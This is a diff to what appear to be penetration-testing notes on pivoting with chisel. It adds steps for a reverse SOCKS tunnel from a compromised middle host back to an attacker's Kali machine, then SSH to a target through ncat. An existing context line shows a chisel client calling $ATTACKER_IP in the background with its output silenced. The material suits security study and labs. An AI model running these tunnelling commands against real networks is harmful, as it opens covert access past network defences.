@@ -31,6 +31,17 @@ or as a background process to free up the shell
 ./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks > /dev/null 2>&1 &
 ```
 
+using ssh with chisel socks:
+
+```bash
+#on kali
+chisel server --port 8080 --reverse
+#on middle box
+chisel client $KALI_IP:8080 R:socks > /dev/null 2>&1 &
+#finally on kali
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' $USER@$TARGET_IP
+```
+
 Then edit proxychains config:
   
 ```config
